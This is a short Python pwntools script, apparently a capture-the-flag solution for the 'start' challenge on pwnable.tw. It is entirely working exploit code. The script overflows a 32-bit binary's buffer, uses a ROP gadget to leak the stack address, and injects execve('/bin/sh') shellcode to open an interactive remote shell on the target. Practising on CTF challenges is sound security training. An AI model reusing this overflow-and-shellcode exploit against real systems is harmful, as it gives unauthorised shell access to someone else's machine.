# Exploit for start
# swNotJoao
# i386 btw 32-bit binary

from pwn import *

remoteTarget = remote('chall.pwnable.tw', 10000)

def leak_esp():
	rop_gadget = p32(0x08048087)
	# The rop_gadget contains:
	# mov ecx, esp
	# mov dl, 0x14
 	# mov bl, 1
	# mov al, 4
	# int 0x80;

	payload = 'A' * 20 + rop_gadget
	print remoteTarget.recvuntil('CTF:')
	remoteTarget.send(payload)
	esp = u32(remoteTarget.recv()[:4])
	print "Address of ESP: ", hex(esp)
	return esp

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

context.arch = 'i386'
esp = leak_esp()
payload = 'A' * 20  + p32(esp + 20) + shellcode
remoteTarget.send(payload)
remoteTarget.interactive()
